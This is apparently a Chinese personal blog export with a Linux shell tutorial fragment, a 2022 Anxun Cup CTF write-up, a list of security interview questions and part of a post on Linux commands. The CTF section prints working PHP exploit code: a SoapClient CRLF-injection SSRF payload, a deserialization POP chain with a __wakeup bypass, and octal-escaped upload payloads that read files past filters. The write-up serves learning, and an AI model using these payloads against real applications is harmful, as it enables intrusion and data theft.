shell使用（使用.csh扩展名）。</p><p>其中lang.csh和lang.sh文件是用来设置字符集的。</p></blockquote></li><li><p>$HOME目录下的启动文件</p><blockquote><p>这些启动文件都起着同一个作用：提供一个用户专属的启动文件来定义该用户所用到的环</p><p>境变量。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -a $HOME</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $HOME/.bash_profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bash_profile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the aliases and <span class="built_in">functions</span></span></span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">. ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific environment and startup programs</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line"></span><br><span class="line">export PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>这里先会判断.bashrc文件是否存在，若存在先执行这个文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat .bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里可以设置别名，比如我添加<code>alias la=&#39;ls -a&#39;</code>,重启shell后</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat ~/.bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias la=&#x27;ls -a&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line">fi</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>PATH=$PATH:$HOME/bin</code>则应该是登录shell后自动添加路径到PATH中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">编辑为PATH=$PATH:$HOME/bin:$HOME/my_cmd</span><br><span class="line">重启shell后/source立即生效后</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="环境变量立即生效"><a href="#环境变量立即生效" class="headerlink" title="环境变量立即生效"></a>环境变量立即生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source xxx</span><br></pre></td></tr></table></figure><h3 id="环境变量特性"><a href="#环境变量特性" class="headerlink" title="环境变量特性"></a>环境变量特性</h3><blockquote><p>环境变量有一个很酷的特性就是，它们可作为数组使用。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# arrary=(1 2 3)</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary[1]</span><br><span class="line">1[1]</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;arrary[1]&#125;</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>在使用变量时最好将变量名用{}括起来，否则可能会解析错误。</p><h1 id="shell脚本编写"><a href="#shell脚本编写" class="headerlink" title="shell脚本编写"></a>shell脚本编写</h1><ol><li><p>创建shell脚本</p><blockquote><p>在创建shell脚本文件时，必须在文件的第一行指定要使用的shell。其格式为：<code>#!/bin/bash </code></p><p>在通常的shell脚本中，井号（#）用作注释行。shell并不会处理shell脚本中的注释行。然而，</p><p>shell脚本文件的第一行是个例外，#后面的惊叹号会告诉shell用哪个shell来运行脚本。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo hello world</span><br></pre></td></tr></table></figure></li><li><p>设置权限</p><p><code>sudo chmod +x file_name </code></p></li><li><p>运行脚本</p><ul><li>shell 脚本文件名</li><li>chmod +x 脚本文件名; 脚本文件名</li><li>. 脚本文件名</li><li>source 脚本文件名</li></ul></li></ol><p>脚本文件名如<code>./name.sh</code></p><img src="E:\typora img\20210321121053755.png" alt="在这里插入图片描述" style="zoom: 80%;" /><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="定义与使用"><a href="#定义与使用" class="headerlink" title="定义与使用"></a>定义与使用</h4><blockquote><p>如果要用到变量，使用$；</p><p>如果要操作变量，不使用$。</p><p>这条规则的一个例外就是使用printenv显示某个变量的值。</p></blockquote><p>用到变量 → 用到变量的值</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $a  #输出变量的值</span><br><span class="line">printenv PATH #用到变量的值，但不需要加$</span><br></pre></td></tr></table></figure><p>操作变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=1 #定义变量</span><br><span class="line">export a #导出变量</span><br><span class="line">unset a #删除变量</span><br></pre></td></tr></table></figure><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>能够让变量作为命令行参数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls $HOME</span><br><span class="line">H1ve  web</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls /root</span><br><span class="line">H1ve  web</span><br></pre></td></tr></table></figure><p>内敛执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat `ls`</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;读取当前目录的所有文件</span></span><br><span class="line">将ls的输出作为cat的输入进行执行。</span><br></pre></td></tr></table></figure><blockquote><p>先执行的命令是由当前shell创建的子shell执行的。</p></blockquote><p>加上{}用于区分变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=b</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $ab</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">因为找不到变量ab，所以输出为空</span></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;a&#125;b</span><br><span class="line">bb</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>当变量值含有空格时，就要加上引号。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# b= world</span><br><span class="line">-bash: world: command not found</span><br></pre></td></tr></table></figure><p>单引号：不能解析变量，只会原样输出</p><p>双引号：能够解析变量</p><ul><li>获取字符串长度   &#96;$</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022 安洵杯</title>
      <link href="/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>与buu–bestphp‘s revenge差不多</p><ul><li>session+反序列化</li><li>原生类SSRF+文件操作</li></ul><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>第一步，设置php的session解析器，使得下一次会话时session中保存的是构造好的SoapClient对象。</p><p>SoapClient对象</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $target = &quot;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&quot;; 查找flag文件名</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=123456789&#x27;</span> <span class="comment"># 随便给一个</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128162813314-1686150400485.png" alt="image-20221128162813314"></p><p>第二步，反序列化触发SoapClient的call方法，从而导致SSRF，从而将flag保存到SSRF请求对应的session中。</p><p>pop：</p><p>B::destruct   →    C::toString   →   A::invoke    →   C::uwant</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;babyhacker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发invoke\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;a) &amp;&amp; <span class="variable language_">$this</span>-&gt;a == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发destruct\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;getflag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发toString\n&quot;</span>;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uwant</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发uwant\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a == <span class="string">&quot;phpinfo&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="variable">$this</span>-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c2</span> =<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;0e215962017&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$c2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">// echo $result;</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:1:&quot;A&quot;:2:&#x27;</span>, <span class="string">&#x27;O:1:&quot;A&quot;:3:&#x27;</span>,<span class="variable">$result</span>);<span class="comment">//绕过__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128163059684-1686150400486.png" alt="image-20221128163059684"></p><p>这里的500是因为C::tostring()的报错，而不是反序列化出错。</p><img src="E:\typora img\image-20221128163329919.png" alt="image-20221128163329919" style="zoom:67%;" /><p>第三步，修改cookie中的PHPSESSIONID为SSRF请求的PHPSESSIONID，读取到flag。</p><p><img src="/../images/image-20221128163549644-1686150400486.png" alt="image-20221128163549644"></p><p>查看flag文件名的结果</p><p><img src="/../images/image-20221128163822875-1686150400486.png" alt="image-20221128163822875"></p><h2 id="easy-upload–复现"><a href="#easy-upload–复现" class="headerlink" title="easy_upload–复现"></a>easy_upload–复现</h2><p>dirsearch扫描没有发现其他页面。</p><p>只有一个文件上传功能点</p><ul><li>先上传一句话木马，发现有过滤</li></ul><p><img src="/../images/image-20221128164147870-1686150400486.png" alt="image-20221128164147870"></p><ul><li>尝试图片+.htaceess</li></ul><p><img src="/../images/image-20221128164425319-1686150400486.png" alt="image-20221128164425319"></p><p>发现只接受.php文件，那么就是要绕过文件内容过滤。</p><p>经测试发现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ ` * 还有很多函数被过滤</span><br></pre></td></tr></table></figure><p>以下可以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164736609-1686150400486.png" alt="image-20221128164736609"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164852425-1686150400487.png" alt="image-20221128164852425"></p><p>在phpinfo中可以发现<code>disable_function</code>禁用了几乎所有的函数。</p><img src="E:\typora img\image-20221128164951239.png" alt="image-20221128164951239" style="zoom:67%;" /><p>但是没有禁用<code>file_get_contents</code>这个读取文件的函数。所以只要能找到flag的路径就可以了。</p><p>网上的师傅做法是利用原生类来找到路径，利用php字符串解析来绕过字符过滤。</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>查找路径</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \147\154\157\142\72\57\57\57\146\52 → glob:///f*</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;\147\154\157\142\72\57\57\57\146\52&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165717142-1686150400487.png" alt="image-20221128165717142"></p><p>读取flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163 → file_get_contents</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163&quot;</span>(<span class="string">&quot;/fl1111111111ag&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165926537-1686150400487.png" alt="image-20221128165926537"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="flybenben–复现"><a href="#flybenben–复现" class="headerlink" title="flybenben–复现"></a>flybenben–复现</h2><p>CE修改</p><p><img src="/../images/QQ%E6%88%AA%E5%9B%BE20221128160736-1686150400487.jpg" alt="QQ截图20221128160736"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HW面试</title>
      <link href="/2023/05/31/HW%E9%9D%A2%E8%AF%95/"/>
      <url>/2023/05/31/HW%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>三次面试的集合</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><p>自我介绍</p></li><li><p>之前护网主要做什么</p></li><li><p>设备使用</p><p>用过哪些安全设备，具体产商，具体怎么用（语法是什么）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">监测中心（态势感知,整体：数量），威胁感知（告警数据包），分析中心（日志分析,行为分析），响应处置(策略管理，处置)，资产感知，报告生成</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">协议：  proto:ftp</span><br><span class="line">ip：   sip：源ip  dip：目的ip</span><br><span class="line">攻击成功：  normal_ret：success</span><br><span class="line">请求路径：uri：路径</span><br><span class="line">http状态码： status：404</span><br><span class="line">域名：host：域名</span><br><span class="line">请求体：    data：请求体数据</span><br><span class="line">UA：  agent：UA</span><br><span class="line">请求方法: method:请求方法</span><br><span class="line"></span><br><span class="line">检索web流量： host “” and sip “” and dip：*</span><br></pre></td></tr></table></figure><p>负责外网还是内网，有很多误报怎么办</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip+威胁情报社区</span><br><span class="line"></span><br><span class="line">告警是基于特定关键字、特定规则触发的，部分业务系统由于编码不规范，经常会触发告警，因此需要结合业务实际情况确定是否为正常业务行为触发的误报。比如sql中的1=1</span><br><span class="line"></span><br><span class="line">巡检，需要加入ip白名单</span><br></pre></td></tr></table></figure><p>如何判断攻击成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看响应包中的结果是否符合payload的执行结果</span><br><span class="line">或者手动复现</span><br></pre></td></tr></table></figure></li><li><p>sql注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql注入原理，方式，防御手段</span><br><span class="line">宽字节注入原理</span><br><span class="line">sql写shell的条件，具体的语句（追问：除了直接写入还有其他方法吗)</span><br><span class="line">sqlmap写shell的参数和原理</span><br><span class="line">使用sqlmap post注入的参数</span><br><span class="line">sql注入绕过waf的方式</span><br><span class="line">sql注入延时注入时，sleep函数被禁用了怎么办</span><br></pre></td></tr></table></figure></li><li><p>渗透测试流程从信息收集开始完整地讲讲</p></li><li><p>xxe有哪些利用方式</p></li><li><p>给你一个场景，thinkphp，可以文件上传，但是有白名单只能上传图片，怎么rce</p></li><li><p>了解过burp的dns功能吗</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看过dnslog日志吗</span><br></pre></td></tr></table></figure></li><li><p>讲一下挖矿木马的处置</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要用什么命令定位进程所对应的可执行文件</span><br><span class="line">新增用户怎么排查（windows和linux）</span><br><span class="line">用什么命令排查linux的特权用户 </span><br><span class="line">一直杀不掉怎么办（要看哪些文件/目录）</span><br></pre></td></tr></table></figure></li><li><p>java内存马类型</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">各自原理</span><br><span class="line">冰蝎的木马原理了解过吗</span><br></pre></td></tr></table></figure></li><li><p>渗透中如果机器不出网怎么办</p><p>追问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用的什么反向代理</span><br></pre></td></tr></table></figure></li><li><p>如果可以rce，但是无回显并且不出网怎么办</p></li><li><p>如果机子被上了cs木马，怎么检测出木马进程</p><blockquote><p><a href="http://weizn.net/?p=439">通过Sysmon日志检测Cobalt Strike木马 - Wayne’s Blog</a></p><p>心跳包</p><p>命令执行格式：cmd.exe的完整路径 + <span style="color: #ff0000;">大写&#x2F;C</span>参数 + 实际执行命令。</p></blockquote></li><li><p>wireshark用过吗</p></li><li><p>假设上传了webshell，攻击者会使用webshell管理工具进行连接，讲一下这些管理工具的流量特征</p></li><li><p>讲一下java的shiro，log4j等漏洞</p></li><li><p>有做过溯源吗，了解的说说</p></li><li><p>简历上说挖掘过逻辑漏洞，现在给你一个登录框，你有什么思路</p></li><li><p>假设有一个存储型xss，怎么进行持久化</p></li><li><p>如果通知机器上出现了一些可疑的文件和目录，怎么进行应急响应</p></li><li><p>讲一下文件上传黑白名单绕过</p><p>追问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中间件解析漏洞讲讲</span><br></pre></td></tr></table></figure></li><li><p>主机基线规范讲一下</p></li><li><p>如果护网期间出现了0day该怎么办</p><blockquote><p>查看资产中是否有0day涉及到的应用，如果存在，可以尝试修复或者进行复现，比如说使用公开的poc进行测试，看一下会留下什么痕迹，根据这些痕迹建立检测机制</p></blockquote></li><li><p>讲一下内网中的票据</p></li><li><p>windows事件状态码</p><p><img src="/../images/image-20230426165150875-1686284102691.png" alt="image-20230426165150875"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令本质</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="命令本质"><a href="#命令本质" class="headerlink" title="命令本质"></a>命令本质</h2><p>命令实际上就是具有一定功能的二进制文件</p><h2 id="命令位置"><a href="#命令位置" class="headerlink" title="命令位置"></a>命令位置</h2><p>&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用</p><p>&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</p><h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p><img src="/../images/4dbf34717d434bb692683937feb52fea.png" alt="img"></p><h2 id="命令分类–外部和内建"><a href="#命令分类–外部和内建" class="headerlink" title="命令分类–外部和内建"></a>命令分类–外部和内建</h2><blockquote><p>内建命令实际上是shell程序的一部分，简单快速系统bash内置源码<br>比如：exit，history，cd，echo等。</p><p>外部命令是linux系统中的实用程序部分，外部命令的实体并不包含在shell中，但是其命令执行过程是由shell程序控制的。外部命令是在bash之外额外安装的，通常放在&#x2F;bin，&#x2F;usr&#x2F;bin，&#x2F;sbin，&#x2F;usr&#x2F;sbin等</p></blockquote><ul><li><p>查看外部命令存储位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220710194138135-1686283886642.png" alt="image-20220710194138135"></p><p>注：这里的PATH就是经常提到的环境变量</p><blockquote><p>当用户执行的是外部命令时，系统会在指定的多个路径中查找command的可执行文件，而定义这些路径的变量，就称为 PATH 环境变量，其作用就是告诉 Shell 待执行命令的可执行文件可能存放的位置，Shell 会在 PATH 变量包含的多个路径中逐个查找，直到找到为止（如果找不到，Shell 会提供用户“找不到此命令”）。</p></blockquote></li><li><p>判断命令是否为外部还是内建命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="built_in">command</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type vim</span><br><span class="line">vim is /usr/bin/vim</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type ps</span><br><span class="line">ps is hashed (/usr/bin/ps)</span><br></pre></td></tr></table></figure></li><li><p>区别</p><ul><li><p>外部命令</p><blockquote><p>当外部命令执行时，会创建出一个子进程。这种操作被称为衍生（forking）。外部命令ps很方便显示出它的父进程以及自己所对应的衍生子进程。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span 